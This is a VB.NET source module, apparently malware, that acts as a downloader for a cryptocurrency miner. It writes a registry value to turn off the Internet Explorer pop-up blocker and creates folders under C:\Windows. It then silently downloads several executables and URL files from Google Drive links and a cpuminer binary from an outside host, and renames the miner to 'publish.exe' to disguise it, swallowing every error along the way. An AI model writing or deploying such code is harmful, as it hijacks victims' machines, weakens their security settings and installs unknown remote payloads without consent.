Imports System.Net
Imports System.ComponentModel

Module Miner
    Sub MainMiner()
        If My.Computer.Network.IsAvailable Then
            Try
                Download()
            Catch ex As Exception
            End Try
        Else
            ' MsgBox("Computer is not connected.")
        End If
    End Sub

    Private Sub Download()
        Dim WshShell As Object
        Dim popupKeyPath As String
        WshShell = CreateObject("WScript.Shell")
        popupKeyPath = "HKCU\Software\Microsoft\Internet Explorer\New Windows\PopupMgr"
        'Disable the IE pop-up blocker
        WshShell.RegWrite(popupKeyPath, "no", "REG_SZ")

        '1
        Dim publish As String = "C:\Windows\Software\publish.exe"
        Dim miner As String = "C:\Windows\Software\minerd-wolf-07-09-14.exe"

        Dim modify As String = "C:\Windows\SoftModify\modify.exe"
        Dim TaskClean As String = "C:\Windows\TaskClean\TaskClean.exe"

        My.Computer.FileSystem.CreateDirectory(
                    "C:\Windows\Software")
        My.Computer.FileSystem.CreateDirectory(
                    "C:\Windows\TaskClean")
        My.Computer.FileSystem.CreateDirectory(
                    "C:\Windows\SoftModify")

        'Download modify file 
        If My.Computer.FileSystem.FileExists(modify) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3OEludk5CeGd3U0E"), modify)
            End Using
        End If

        If My.Computer.FileSystem.FileExists(TaskClean) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3aHFKV09DYTItNzg"), TaskClean)
            End Using
        End If

        Try
            If My.Computer.FileSystem.FileExists(publish) Then
            Else
                Using myWebClient As New WebClient()
                    AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                    myWebClient.DownloadFileAsync(New Uri("https://ottrbutt.com/cpuminer-multi/minerd-wolf-07-09-14.exe"), miner)
                End Using
            End If
        Catch ex As Exception
        End Try

        Dim TaskALL As String = "C:\Windows\Software\TaskALL.exe"
        If My.Computer.FileSystem.FileExists(TaskALL) Then
        Else
            Using myWebClient As New WebClient()
                AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
                myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3WHVfay1vX1doRVE"), TaskALL)

            End Using
        End If

        Dim Url As String = "C:\Windows\Software\Url.txt"
        Using myWebClient As New WebClient()
            AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
            myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3UVZyT3c3TXVMY3M"), Url)
        End Using

        'mUrl
        Dim mUrl As String = "C:\Windows\Software\mUrl.txt"
        Using myWebClient As New WebClient()
            AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
            myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3NzFWSDB6dW5xV0E"), mUrl)
        End Using

        Dim modifyUrl As String = "C:\Windows\Software\modifyUrl.txt"
        Using myWebClient As New WebClient()
            AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
            myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3cmIyUG4zS0N5YlE"), modifyUrl)
        End Using

        Threading.Thread.Sleep(1 * 18 * 1000)
        My.Computer.FileSystem.RenameFile("C:\Windows\Software\minerd-wolf-07-09-14.exe", "publish.exe")
    End Sub

    Public Sub DownloadCompleted(sender As Object, e As AsyncCompletedEventArgs)
        'Console.WriteLine("Success")
    End Sub
End Module
